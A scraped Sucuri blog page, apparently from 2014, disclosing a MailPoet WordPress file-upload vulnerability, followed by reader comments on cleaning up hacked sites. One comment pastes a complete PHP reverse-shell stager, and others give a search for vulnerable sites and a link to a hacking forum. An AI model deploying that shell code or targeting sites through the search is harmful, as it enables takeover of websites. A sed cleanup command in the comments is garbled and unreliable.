* [![](https://secure.gravatar.com/avatar/fcf2c7b3195ff9058d29af3b8a49fc43?s=20&d=mm&r=g)Ben Martin](https://blog.sucuri.net/author/benmartin "View all posts by Ben Martin")
* July 27, 2020
 As 2020 continues to be the worst year in almost anybody’s lifetime, allow me to take this opportunity to stoke the fires of your existential…  [Read the Post](https://blog.sucuri.net/2020/07/reverse-string-woocommerce-wordpress-credit-card-swiper.html)    ![](https://blog.sucuri.net/wp-content/uploads/2023/05/23-BlogPost_Feature-Image_1490x700_What-is-XML-RPC_A-Guide-to-xml-rpc.php_Security-Risks-How-to-Disable-390x183.jpg)

* [Security Education](https://blog.sucuri.net/category/security-education)
* [Web Pros](https://blog.sucuri.net/category/web-pros)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [What is XML-RPC? Security Risks & How to Disable](https://blog.sucuri.net/2023/05/what-is-xml-rpc-security-risks-how-to-disable.html)

* [![](https://secure.gravatar.com/avatar/a3ef43c4765fe447a305b82f38ea7bd1?s=20&d=mm&r=g)Rianna MacLeod](https://blog.sucuri.net/author/rianna "View all posts by Rianna MacLeod")
* May 4, 2023
 XML-RPC is a protocol designed for WordPress to standardize communication between different systems, allowing external applications (such as other blogging platforms and desktop clients) to…  [Read the Post](https://blog.sucuri.net/2023/05/what-is-xml-rpc-security-risks-how-to-disable.html)  ![Labs Note](https://blog.sucuri.net/wp-content/uploads/2020/07/sucuri-labs-og-abstract-1-390x205.png)

* [Sucuri Labs](https://blog.sucuri.net/category/sucuri-labs)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Backdoor plugin hides from view](https://blog.sucuri.net/2019/07/backdoor-plugin-hides-from-view.html)

* [![](https://secure.gravatar.com/avatar/b020abf59d6245e6b2a4635063322498?s=20&d=mm&r=g)Luke Leal](https://blog.sucuri.net/author/luke "View all posts by Luke Leal")
* July 24, 2019
 One of the most important traits for backdoors is the ability to remain undetected by most users — otherwise it may draw suspicion and be…  [Read the Post](https://blog.sucuri.net/2019/07/backdoor-plugin-hides-from-view.html)  ![Labs Note](https://blog.sucuri.net/wp-content/uploads/2020/07/sucuri-labs-og1-390x181.png)

* [Sucuri Labs](https://blog.sucuri.net/category/sucuri-labs)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)

## [PHP Script Nukes All Website Files](https://blog.sucuri.net/2017/08/php-script-nukes-all-website-files.html)

* [![](https://secure.gravatar.com/avatar/fcf2c7b3195ff9058d29af3b8a49fc43?s=20&d=mm&r=g)Ben Martin](https://blog.sucuri.net/author/benmartin "View all posts by Ben Martin")
* August 8, 2017
 Most malware and spam that we come across has some sort of discernable purpose to it, usually something which benefits the attackers financially. This is…  [Read the Post](https://blog.sucuri.net/2017/08/php-script-nukes-all-website-files.html)
##### Search

 Search for:  Search[![Website Malware Guide Sidebar](https://blog.sucuri.net/wp-content/uploads/2024/02/Website-Malware-Guide-Sidebar.jpg)](https://sucuri.net/guides/website-malware/)[![WordPress Security Guide Sidebar](https://blog.sucuri.net/wp-content/uploads/2024/02/WordPress-Security-Guide-Sidebar.jpg)](https://sucuri.net/guides/wordpress-security/)[![](https://blog.sucuri.net/wp-content/uploads/2023/04/23-sucuri-newsletter-blog-banner.png)](https://info.sucuri.net/subscribe-to-security)[![Sucuri Sidebar Malware Removal to Signup Page](https://blog.sucuri.net/wp-content/uploads/2023/08/23-sucuri-blog-sidebar-banner-need-help-cleaning-up-malware-on-your-website-get-help-now-new.png)](https://sucuri.net/website-security-platform/signup/) ![Sucuri Logo](https://sucuri.net/wp-content/uploads/2022/12/sucuri_logo_dark.svg)

Let’s Connect

        [Products](https://sucuri.net/website-security/)   [Website Firewall](https://sucuri.net/website-firewall/)   [Website Security Platform](https://sucuri.net/website-security-platform/)   [WordPress Security](https://sucuri.net/wordpress-security/)   [Website Backups](https://sucuri.net/website-backups/)   [Hack Assistance](https://sucuri.net/website-security-platform/help-now/)   [Pricing](https://sucuri.net/website-security-platform/signup)   [Solutions](https://sucuri.net/ddos-protection/)   [DDoS Protection](https://sucuri.net/ddos-protection/)   [Malware Detection](https://sucuri.net/malware-detection-scanning/)   [Malware Removal](https://sucuri.net/website-malware-removal/)   [Malware Prevention](https://sucuri.net/website-hack-protection/)   [Blacklist Removal](https://sucuri.net/website-security-platform/blocklist-removal-and-repair/)   [SEO Spam Removal](https://sucuri.net/seo-spam-removal/)  USE CASES  [Developers](https://sucuri.net/developers/)   [Ecommerce](https://sucuri.net/ecommerce-website-security/)   [Agency Plans](https://sucuri.net/custom/agency/)   [Enterprise Services](https://sucuri.net/custom/agency/)   [HTTPS/2](https://sucuri.net/http-2-rapid-reset/)   [Virtual Patching](https://sucuri.net/virtual-patching/)   [Support](https://docs.sucuri.net/)   [Knowledge Base](https://docs.sucuri.net/)   [SiteCheck](https://sitecheck.sucuri.net/)   [Guides](https://sucuri.net/guides/)   [Research Labs](https://labs.sucuri.net/)   [Report Abuse](https://abuse.sucuri.net/)   [Status Report](https://status.sucuri.net/)   [Company](https://sucuri.net/company/)   [About Sucuri](https://sucuri.net/company/)   [Contact](https://sucuri.net/company/contact-us/)   [Blog](https://blog.sucuri.net/)   [Referral](https://sucuri.net/referral/)   [Partners](https://sucuri.net/partners/)   [Testimonials](https://sucuri.net/customers/)  [Terms of Use](https://sucuri.net/terms/) [Privacy Policy](https://sucuri.net/privacy/) [Do Not Sell My Personal Information](https://sucuri.net/cookies/) [Frequently Asked Questions](https://sucuri.net/faq/)

© 2025 GoDaddy Mediatemple, Inc., d/b/a Sucuri. All rights reserved.

   [back to top](#top "Going Top")  X

Sucuri Cookie Policy
 [See our policy>>](https://sucuri.net/cookies)

Our website uses cookies, which help us to improve our site and enables us to deliver the best possible service and customer experience.

 Accept Decline Manage Options

=== Content from blog.sucuri.net_577d4a62_20250125_223245.html ===
  [![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)
     [![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
 [Login](https://dashboard.sucuri.net/login/)       [Login](https://dashboard.sucuri.net/login)

New Customer?

[Sign up now.](https://sucuri.net/website-security-platform/signup/)

* [Submit a ticket](https://support.sucuri.net/support/?new)
* [Knowledge base](https://docs.sucuri.net/)
* [Chat now](https://sucuri.net/live-chat/)
 Search for:  Search

* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)
# Remote File Upload Vulnerability in WordPress MailPoet Plugin (wysija-newsletters)

  [![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g)](https://blog.sucuri.net/author/dcid)   [Daniel Cid](https://blog.sucuri.net/author/dcid)

* July 1, 2014

Marc-Alexandre Montpas, from our research team, found a serious security vulnerability in the MailPoet WordPress plugin. This bug allows an attacker to upload any file remotely to the vulnerable website (i.e., no authentication is required).

This is a serious vulnerability, [The MailPoet plugin (wysija-newsletters)](https://wordpress.org/plugins/wysija-newsletters/) is a very popular WordPress plugin (over 1,700,000 downloads). This vulnerability has been patched, **if you run the WordPress MailPoet plugin please upgrade ASAP!**

##### Are You Affected?

If you have this plugin activated on your website, the odds are not in your favor. An attacker can exploit this vulnerability without having any privileges/accounts on the target site. This is a major threat, it means every single website using it is vulnerable.

The only safe version is the **2.6.7**, this was just released a few hours ago (2014-Jul-01).

##### Why is it So Dangerous?

This bug should be taken seriously, it gives a potential intruder the power to do anything he wants on his victim’s website. It allows for any PHP file to be uploaded. This can allow an attacker to use your website for phishing lures, sending spam, host malware, infect other customers (on a shared server), and so on!

##### Technical Details

Our research team discovered this flaw a few weeks ago and immediately disclosed it to the MailPoet team. They responded very well and released a patch as quickly as possible.

Because of the nature of the vulnerability, specifically it’s severity, we will not be disclosing additional technical details. The basics of the vulnerability however is something all plugin developers should be mindful of: the vulnerability resides in the fact that the developers assumed that WordPress’s **admin\_init** hooks were only called when an administrator user visited a page inside **/wp-admin/**.

It is an easy mistake to make and they used that hook (admin\_init) to verify if a specific user was allowed to upload files.

However, any call to **/wp-admin/admin-post.php** also executes this hook without requiring the user to be authenticated, thus making their theme upload functionality available to everybody.

*Pro-tip: If you are a developer, never use **admin\_init()** or **is\_admin()** as an authentication method.*

##### How Should You Protect Yourself?

**Again, update the plugin as soon as possible**. Keeping WordPress and all plugins updated is the first step to keep your sites secured.

*For our customers: The good news is that any website behind our [Website Firewall – CloudProxy](http://cloudproxy.sucuri.net) has been protected against this vulnerability since we found it.*

  [![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=120&d=mm&r=g)](https://blog.sucuri.net/author/dcid)
##### [Daniel Cid](https://blog.sucuri.net/author/dcid)

Daniel B. Cid is Founder of Sucuri and the VP of Engineering for the GoDaddy Security Products group. He is also the founder of OSSEC and [CleanBrowsing](https://cleanbrowsing.org). You can find more about Daniel on his site [dcid.me](http://dcid.me) or on [Twitter: @danielcid](https://twitter.com/danielcid)

##### Related Tags

* [WordPress Plugins and Themes](https://blog.sucuri.net/tag/wordpress-plugins-and-themes)
##### 40 comments

1. ![](https://secure.gravatar.com/avatar/bd1b0c0fd53cf1879636a1ae3c8ae013?s=60&d=mm&r=g) **[Casey Friday](http://www.caseyfriday.com/)** says: [July 1, 2014 at 4:40 pm](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3636)

   It’s unfortunate to hear about this from Sucuri, and not yet from Mailpoet. I don’t know if Sucuri contacts plugin authors before they post articles like this, but it feels like Mailpoet is not especially concerned about this, since they simply noted this article in the changelog to today’s update.

   Things like this make me want to move my development away from WordPress and towards something more secure (a.k.a. more obscure).

   1. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **Daniel Cid** says: [July 1, 2014 at 5:07 pm](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3637)

      Hi Casey,

      Yes, they were notified weeks in advance and replied pretty quickly to work on a patch.

      1. ![](https://secure.gravatar.com/avatar/8f5523080de4d43c0ad08433e3491663?s=60&d=mm&r=g) **Xavier KRESS** says: [July 18, 2014 at 9:45 am](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3647)

         Unfortunately, those patches should be notified with more evidence on WP

         1. ![](https://secure.gravatar.com/avatar/d28241c73c06fb1b7766e8b12c03a416?s=60&d=mm&r=g) **[WatWebDev.com](http://watwebdev.com/)** says: [July 19, 2014 at 9:38 am](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3656)

            The problem I think is multi-layered. Many themes use this plugin and there is no real way of communicating issues of this nature. That is something that I think wordpress should look at including. A method that allows a plugin author to submit a warning, which triggers on their website and emails the webmaster.
             We were not emailed about this issue as it was part of a theme that was purchased from ThemeForrest.

            1. ![](https://secure.gravatar.com/avatar/d8164b24343dd87dd5ba4b30a7259b1f?s=60&d=mm&r=g) **Kim** says: [July 22, 2014 at 1:58 pm](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3662)

               What theme includes the MailPoet plugin, out of curiosity?
            2. ![](https://secure.gravatar.com/avatar/f1a2582a0039615feda0c1efbc37a9e7?s=60&d=mm&r=g) **[Jon Schroeder](http://redfishbluefishmedia.com/)** says: [July 29, 2014 at 12:31 am](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3665)

               That’s a horrible practice. Themes should NEVER include plugins like that, for reasons that go well beyond this particular case (in part, because including a plugin’s functionality directly often leads to an inability to update the plugin). I’d be careful about using that theme or any like it in the future.

               But you make a good point about WordPress including this sort of functionality.
            3. ![](https://secure.gravatar.com/avatar/d28241c73c06fb1b7766e8b12c03a416?s=60&d=mm&r=g) **[WatWebDev.com](http://watwebdev.com/)** says: [August 25, 2014 at 11:47 pm](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3668)

               Sorry for the late reply, Disqus wouldn’t let me reply for some reason.
                I should have been clearer in what I said. When I said that it was part of a theme we purchased, what I meant was that it was a required plugin that the theme installed. Just to be clear: it was a plugin, the code was not included within the theme coding.
                WordPress really need to be ramping up their security and taking action. The WordPress core is pretty secure and the issue is the plugins and themes. No matter what you do, no developer can see potential vulnerabilities in the future. There really needs to be a contingency plan. WordPress has made some progress on this with automated updates for the core. I think something needs to be done for plugins. Not just the example I gave in my last reply but I would suggest a method for WordPress to force plugin updates (initiated by WordPress staff) where the update ONLY includes a security fix. Forcing updates where features change can cause unwanted issues.

               We have lots of security and when wordpress plugins have security issues that we do not catch in time, our security system blocks all attempts to exploit the code, upload files or login.
2. ![](https://secure.gravatar.com/avatar/76dcc4ef8bd635cc2ce1b0ef7c3b1a25?s=60&d=mm&r=g) **Flag** says: [July 2, 2014 at 4:37 am](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3638)

   Hi, After a proper verification of Mail poet 2.6.6 codes, I concluded there is no Security risks.
    The theme function doesn’t sanitize the files but its not accessible by public.
3. ![](https://secure.gravatar.com/avatar/ce72242363df3affa5ad8b02613ecd3c?s=60&d=mm&r=g) **y** says: [July 2, 2014 at 2:58 pm](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-6017)

   It is already on skiddie forum like 0day
    <http://www.hackforums.net/showthread.php?tid=4317662>
4. ![](https://secure.gravatar.com/avatar/1cf0770522223715996d00a7fe911003?s=60&d=mm&r=g) **[Ian Dunn](http://iandunn.name)** says: [July 2, 2014 at 4:18 pm](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3639)

   > Pro-tip: If you are a developer, never use admin\_init() (or is\_admin()) as an authentication method.

   It’s worth mentioning that the appropriate authorization check mostly likely would have been `current\_user\_can( ‘upload\_files’ )`.
5. ![](https://secure.gravatar.com/avatar/3fabfa74448ad97ab639f3001802bb32?s=60&d=mm&r=g) **stayready** says: [July 6, 2014 at 1:13 am](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3640)

   Between your article and the commented code changes in the diffs, it was fairly straight forward to recreate this. Good find!
6. ![](https://secure.gravatar.com/avatar/81f0b71748c71a7e54cfb4fe3372f292?s=60&d=mm&r=g) **Daniel Smith** says: [July 8, 2014 at 6:39 am](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3641)

   Seems like the plugin also exposes the websites full path when visiting /wp-content/plugins/wysija-newsletters/ full path disclosure vulnerability

   1. ![](https://secure.gravatar.com/avatar/46014e41c0048300aa1bd846367fb46d?s=60&d=mm&r=g) **Luke** says: [July 8, 2014 at 2:21 pm](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-6018)

      here’s some websites that may or may not be vulnerable 😉
       <https://www.google.com/search?as_q=wysija-newsletters&as_epq=&as_oq=&as_eq=&as_nlo=&as_nhi=&lr=&cr=&as_qdr=all&as_sitesearch=&as_occt=url&safe=images&tbs=&as_filetype=&as_rights=&gws_rd=ssl#as_qdr=all&lr=&q=allinurl:+wp-content%2Fplugins%2Fwysija-newsletters>
7. ![](https://secure.gravatar.com/avatar/a573179c7869f90faa15c1c7a0ca17cb?s=60&d=mm&r=g) **Wsysija plugin user** says: [July 9, 2014 at 7:34 pm](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3642)

   Thank you for bringing this to our attention. I have disable this plugin for now. Can you please tell us what and where to look to be able to find if anyone inserted, or uploaded, something not wanted on our server. Is it all contained within their folder or could the person upload into other areas too?
8. ![](https://secure.gravatar.com/avatar/990519aa7fecf4992f0814ed6a5e8a13?s=60&d=mm&r=g) **Demian Scott** says: [July 12, 2014 at 7:36 pm](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3643)

   i tried on a site, after following the payload link , this is what it gave me

   error\_reporting(0); # The payload handler overwrites this with the correct LHOST before sending # it to the victim. $ip = ‘10.164.73.233’; $port = 4444; $ipf = AF\_INET; if (FALSE !== strpos($ip, “:”)) { # ipv6 requires brackets around the address $ip = “[“. $ip .”]”; $ipf = AF\_INET6; } if (($f = ‘stream\_socket\_client’) && is\_callable($f)) { $s = $f(“tcp://{$ip}:{$port}”); $s\_type = ‘stream’; } elseif (($f = ‘fsockopen’) && is\_callable($f)) { $s = $f($ip, $port); $s\_type = ‘stream’; } elseif (($f = ‘socket\_create’) && is\_callable($f)) { $s = $f($ipf, SOCK\_STREAM, SOL\_TCP); $res = @socket\_connect($s, $ip, $port); if (!$res) { die(); } $s\_type = ‘socket’; } else { die(‘no socket funcs’); } if (!$s) { die(‘no socket’); } switch ($s\_type) { case ‘stream’: $len = fread($s, 4); break; case ‘socket’: $len = socket\_read($s, 4); break; } if (!$len) { # We failed on the main socket. There’s no way to continue, so # bail die(); } $a = unpack(“Nlen”, $len); $len = $a[‘len’]; $b = ”; while (strlen($b) < $len) { switch ($s\_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket\_read($s, $len-strlen($b)); break; } } # Set up the socket for the main stage to use. $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock\_type'] = $s\_type; eval($b); die();
9. ![](https://secure.gravatar.com/avatar/c53e058dfc4625fffc9e20f2587f1171?s=60&d=mm&r=g) **spoonjab** says: [July 17, 2014 at 6:51 pm](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3644)

   Unfortunately, I found this article post-hack. The havok this plugin caused is immense: encrypted text in EVERY single php file on our site. Rogue entries in the database. Also, 29k emails were found to be sent via PHP mailer. Damaged our sending reputation for a few days and clean up took days. Didn’t know that MailPoet was the vulnerability until my webhost identified it during clean up. Interestingly enough, the Sucuri wordpress plugin did not detect any problems…

   1. ![](https://secure.gravatar.com/avatar/518cd054a19437f16a4c5ff440f4f41c?s=60&d=mm&r=g) **Vincent** says: [July 17, 2014 at 9:47 pm](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3645)

      Same here. My script is cleaning all php files… What did you find in your database ? What should I look to ?

      1. ![](https://secure.gravatar.com/avatar/c53e058dfc4625fffc9e20f2587f1171?s=60&d=mm&r=g) **spoonjab** says: [July 18, 2014 at 6:08 pm](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3654)

         I just saw some PHP code that could post to the database, so I did a complete restoration. I didn’t dig into the database because I’m not well versed enough to know where in the database to spot change(s)
   2. ![](https://secure.gravatar.com/avatar/8f5523080de4d43c0ad08433e3491663?s=60&d=mm&r=g) **Xavier KRESS** says: [July 18, 2014 at 9:42 am](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3646)

      The same for me, base64 encoded code in all of the PHP files on my server, apparently, the code is sended from remote to my site using the admin-post.php and wp-content/uploads/wysija/themes/mailp/index.php.

      I did not find anything on DB, do you ? what should I check ?

      1. ![](https://secure.gravatar.com/avatar/518cd054a19437f16a4c5ff440f4f41c?s=60&d=mm&r=g) **Vincent** says: [July 18, 2014 at 11:42 am](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3648)

         We should share

         My scans so far :
          grep -r -H “treeroot” .
          grep -r -H “eval(base6” .
          grep -r -H “x40” .|grep -v “.xml”|grep -v “.css”|grep -v stock\_status\_changed\_auto|grep -v “.csv”|grep -v “.sql”
          grep -r -H “<?php eval" .
          grep -r -H "eval(" . #complicated if you have a lot of eval in your regular files
          find . -name license.php
          grep -r -H "rting(0)" .
          grep -r -H "@error\_" .
          grep -r -H "wp\_\_wp" .
          grep -r -H "<?php $" .

         Also, to see the new files

         find . -type f -printf '%T@ %pn' | sort -n | tail -1 | cut -f2- -d" "
          (adjust the tail value)
      2. ![](https://secure.gravatar.com/avatar/b1168babbe7998d910d8de1ecbf17861?s=60&d=mm&r=g) **Neil** says: [July 18, 2014 at 11:48 am](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3650)

         Same exact issue. Removed the code from all the files and now my website seems good

         1. ![](https://secure.gravatar.com/avatar/8f5523080de4d43c0ad08433e3491663?s=60&d=mm&r=g) **Xavier KRESS** says: [July 18, 2014 at 11:58 am](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3651)

            Don’t forget to change your admin passwords and DB pass to prevent a second attack

            1. ![](https://secure.gravatar.com/avatar/b1168babbe7998d910d8de1ecbf17861?s=60&d=mm&r=g) **Neil** says: [July 18, 2014 at 12:23 pm](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3652)

               how would they get the admin pass if they are stored in MD5
            2. ![](https://secure.gravatar.com/avatar/8f5523080de4d43c0ad08433e3491663?s=60&d=mm&r=g) **Xavier KRESS** says: [July 18, 2014 at 1:04 pm](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3653)

               il passwords are not salted, hackers can try to get pass with md5 reverse sites
   3. ![](https://secure.gravatar.com/avatar/b1168babbe7998d910d8de1ecbf17861?s=60&d=mm&r=g) **Neil** says: [July 18, 2014 at 11:47 am](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3649)

      Same here. I fixed it by downloading all the files to my computer as a zip through ssh. Then i used a program like dreamweaver to find and replace the encrypted text. This fixed the issue for a bit and let me log into wordpress. Then i ran a malware scanner and it found two more files a mailpoet one and admin-post.php to also have a custom script at the start.

      How did you fix your php mailer?

      1. ![](https://secure.gravatar.com/avatar/c53e058dfc4625fffc9e20f2587f1171?s=60&d=mm&r=g) **spoonjab** says: [July 18, 2014 at 9:06 pm](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-6020)

         I called my virtual server webhost (hostgator) and they restored copies of all the files pre-hack. Because the malicious code can execute almost anything it wants, it was sending mail from the root user. Removing the malicious files stopped the sending. If you have full ssh access to your server, you can run this paste bin: <http://pastebin.com/G4yUbYSK>

         That will tell you the folders on your server that have sent emails and how many. if you are compromised, it ill be easy to spot.
10. ![](https://secure.gravatar.com/avatar/89fa8430531f74ac099805feb2e64bf8?s=60&d=mm&r=g) **Matt // Modmacro** says: [July 19, 2014 at 4:20 am](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3655)

    Yep, one of our sites was hacked. That was our first experience using MailPoet. Bad taste in mouth….
11. ![](https://secure.gravatar.com/avatar/d28241c73c06fb1b7766e8b12c03a416?s=60&d=mm&r=g) **[WatWebDev.com](http://watwebdev.com/)** says: [July 19, 2014 at 10:49 am](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3657)

    Firstly, sorry if I seem cocky, but after spending so much time and money to secure our server against vulnerabilities and other attacks, I am pleased to report that our customers are safe. We had one customer who used this plugin and the vulnerability was exploited and a file was uploaded. However, due to our other security measures, they were unable to use the vulnerability to do anything. The upload was checked and never went live. A full scan was completed (which automatically completes each night) to look for base64 and any other suspect items. We downloaded all files and manually checked them ourselves to ensure they were clean. We then notified the effected customer of the issue and informed them that they were fully protected and the exploits all failed. Naturally, we then changed all passwords just to be doubly sure.

    I am very happy to see that the security measures we have taken with our server are not paranoia and actually can protect in the wild with vulnerabilities such as this. We host sites for a number of large clients including Fila, so we really have to know that we are as safe as possibly can be.

    For everyone who has been effected, this is a learning curve and we have all been there. All that can be done is to learn from mistakes and push hard to make your server more secure than it was before.
12. ![](https://secure.gravatar.com/avatar/5aa745eb34a9b78ed655536e02af0d49?s=60&d=mm&r=g) **Arky** says: [July 21, 2014 at 9:24 am](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3658)

    Note that the malware’s that took over our machine also inserted a user record with a blank login name and gave it administrator capabilities so they have a back door for future attacks even if you clean up the code.

    Pattern is that the new user has a user ID of “1001001”. You need to go through every database and remove this user and its capability in usermeta. Just one wp instance on a shared server can let them back in to ruin all of them.
13. ![](https://secure.gravatar.com/avatar/887ef3c5d09820fd708df09ab03175be?s=60&d=mm&r=g) **Anne** says: [July 21, 2014 at 10:32 pm](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3659)

    I have been using the updated MailPoet plug-in and yet still ended up with a major security issue this past weekend. Malicioius code was added to all my site files and those of my clients’ sites.
14. ![](https://secure.gravatar.com/avatar/5756bd4c74c2856f31efdc6f81882e95?s=60&d=mm&r=g) **Will** says: [July 22, 2014 at 7:04 am](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3660)

    I too have just recovered from this problem. Every single php file on my folder was infected with rogue code, and every database had the 1001001 user. One entry on the user table, four entries on the usermeta table. I hope deleting them is the end of it.
15. ![](https://secure.gravatar.com/avatar/b9611f1bba1aacbe6f5de5856695a202?s=60&d=mm&r=g) **An Phan** says: [July 22, 2014 at 11:45 am](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3661)

    To remove the malicious code from all of your PHP files, just run this from a shell:

    `find /root/directory -name “\*.php” -exec sed -i ‘s/<?php/<?php/I' {} ; -print`

    Use at your own risk. Full credits go to Vladimir I., from the awesome Webfaction.
16. ![](https://secure.gravatar.com/avatar/fc98dc7b6690c7a987a779e4f06e763f?s=60&d=mm&r=g) **[Jason Coleman](http://www.strangerstudios.com)** says: [July 23, 2014 at 5:06 pm](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3663)

    Yeah, that’s confusing. is\_admin() feels like it should check for admin users, but it really checks if you are in the WordPress dashboard, which non-admin users can be. You really want to do a check like current\_user\_can(“manage\_options”) to see if users have permission to do admin-like things on the website.
17. ![](https://secure.gravatar.com/avatar/7e8187ab136adb581d95a16e7ee836d4?s=60&d=mm&r=g) **tablatronix** says: [July 23, 2014 at 10:18 pm](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-3664)

    Correct me if I am wrong but the actual vulnerability here is that this plugin allows the upload of php files…
18. ![](https://secure.gravatar.com/avatar/41e1e6d73a27848d3c9fe1c72bbcdff2?s=60&d=mm&r=g) **Gears** says: [July 25, 2014 at 3:12 pm](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html#comment-6026)

